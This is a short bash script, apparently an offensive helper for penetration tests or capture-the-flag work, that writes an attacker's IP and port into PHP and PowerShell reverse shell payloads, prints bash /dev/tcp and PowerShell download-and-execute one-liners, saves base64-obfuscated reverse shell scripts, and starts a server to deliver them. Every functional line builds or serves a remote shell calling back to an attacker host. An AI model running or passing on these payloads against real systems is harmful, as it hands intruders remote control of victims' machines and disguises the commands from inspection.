#!/bin/bash

sed -i -E "s/ip = ('[0-9]{1,}.[0-9]{1,}.[0-9]{1,}.[0-9]{1,}')/ip = '$1'/g" reverse-shell.php revSh.ps1
sed -i -E "s/port = ([0-9]{1,})/port = $2/g" reverse-shell.php
sed -i -E "s/port = ('[0-9]{1,}')/port = '$2'/g" revSh.ps1
echo ---------------------
echo "powershell -c \"iex(new-object System.Net.WebClient).DownloadString('http://$1:$3/rps1')\""
echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'"
echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" | base64
echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" | base64 > rb64
echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'" | base64 | tr -- "+/=" "-_."> revBash.sh
echo "echo $(cat revBash.sh)|tr -- \"-_.\" \"+/=\"|base64 -d|bash" > revBashDec.sh
echo "CMD: curl -sqk http://$1:$3/rb|tr -- \"-_.\" \"+/=\"|base64 -d|bash"
echo ---------------------
echo ---------------------
chmod +x revBashDec.sh
chmod +x revBash.sh

python upload_server.py $3 $1
